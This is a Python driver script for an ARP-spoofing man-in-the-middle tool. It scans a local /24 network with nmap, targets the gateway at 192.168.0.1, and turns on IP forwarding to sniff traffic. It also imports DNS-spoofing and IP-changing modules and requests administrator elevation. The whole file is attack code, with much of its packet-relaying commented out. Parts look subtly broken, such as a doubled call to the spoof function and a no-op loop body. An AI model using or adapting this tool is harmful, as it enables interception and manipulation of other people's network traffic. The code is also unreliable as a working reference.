#Import List
import ipaddress
from xml import dom
import scapy.all as scapy
import nmap
import sys
import admin
import os

import ARP_Spoofing
import Change_IP_Address
import DNS_Spoofing
import NetworkDiscovery

def Main():
    #IP = NetFunctions.get_ip()

    #ARGV implementation for final revision
    #if sys.argv.len() <= 1:
    #    print("invalid IP Address")
    #    sys.exit()

    IP = '192.168.0.100' #predifined variable values for testing purposes
    Mac = NetworkDiscovery.get_mac_by_ip_SELF(IP)
    MASK = "255.255.255.0"
    Target = "192.168.0.1"
    TargetMac = NetworkDiscovery.get_mac_by_ip(Target, IP)
    Interface = NetworkDiscovery.get_interface_from_ip(IP)

    # if len(IP.split()) != 4:
    #     print("IP Address invalid, check format")
    #     sys.exit()

    # for num in IP.split():
    #     if (num > 255 or num <= -1 or not (num.int)):
    #         print("IP Address invalid, check format")
    #         sys.exit()

    if not Interface:
        print("Interface invalid, check IP Address")
        sys.exit()

    host = ipaddress.IPv4Address(IP)
    net = ipaddress.IPv4Network(IP + '/' + MASK, False)
    #gw = scapy.conf.route.route("0.0.0.0")[2]

    #starts new thread to run the function that gathers the Network traffic
    # t1 = threading.Thread(target=NetFunctions.NetCap, args=("test.pcap", NetFunctions.get_interface_from_ip(IP)))
    # t1.start()

    try:
       print("Starting Network Host Scan")
       nm = nmap.PortScanner()
       nm.scan(str(net.network_address) + "/24", '1')
       print(nm.all_hosts())
    except KeyboardInterrupt:
       sys.exit()
    except Exception as e: 
       print(f"Network scan failed: {e}")

    print(f"Starting ARP attack against: {Target}")

    IfIPChange=False

    if Target in nm.all_hosts():
        # t2 = multiprocessing.Process(target=NetFunctions.spoof, args=(Target, IP, TargetMac, Mac))
        # t2.start()

        # if(IfIPChange==False):
        #     try:
        #         t2.terminate()
        #         NetFunctions.changeIPAddress(Interface, Target, MASK)
        #         IfIPChange=True

        #         print("IP Address successfully Changed")

        #         t1 = threading.Thread(target=NetFunctions.NetCap, args=("test.pcap", NetFunctions.get_interface_from_ip(IP)))
        #         t1.start()

        #         t2 = multiprocessing.Process(target=NetFunctions.spoof, args=(Target, IP, TargetMac, Mac))
        #         t2.start()

        #     except:
        #         IfIPChange=False

        if (os.name != 'nt'):
            ARP_Spoofing.enable_ip_forwarding()

        while 1:
            NetworkDiscovery.start_sniffing("8.8.8.8", Interface)
            try:
                True
                #packetCapturedGroup = scapy.sniff(iface=NetFunctions.get_interface_from_ip(IP), count=5) #Captures Packets

                #for packetCaptured in packetCapturedGroup:
                    #if packetCaptured: #Checks packets for IP destination and source so that the attacker can send data to original source after manipulating data
                        # if (NetFunctions.packet_callback(packetCaptured) == [Mac, Target]): #checks if destination is target
                        #     packet = packetCaptured.copy()

                        #     packet.pdst = Target
                        #     packet.dst = TargetMac

                        #     scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False)
                        # if (NetFunctions.packet_callback(packetCaptured) == [TargetMac, IP]): #checks if destination is host
                        #     packet = packetCaptured.copy()

                        #     packet.pdst = IP
                        #     packet.dst = Mac

                        #     scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False) 

            except KeyboardInterrupt: #closes on keyboard interupt
                print("Keyboard Interupt")
                ARP_Spoofing.spoof(Target, IP)(IP, Target, Mac, TargetMac)
                Change_IP_Address.changeIPAddress(Interface, IP, MASK)
                ARP_Spoofing.disable_ip_forwarding()
                # t2.join()
                # t1.join()
                sys.exit()
            except Exception as e: #closes on exception
                print(f"Arp spoofing failed: {e}")
                ARP_Spoofing.spoof(Target, IP)(IP, Target, Mac, TargetMac)
                Change_IP_Address.changeIPAddress(Interface, IP, MASK)
                ARP_Spoofing.disable_ip_forwarding()
                # t2.join()
                # t1.join()
                sys.exit()

if __name__ == "__main__": #runs main program and checks for admin privileges
    if not admin.isUserAdmin():
        admin.runAsAdmin()
        print("Requesting Admin privileges")

    else:
        print("Successfully elevated")
        Main()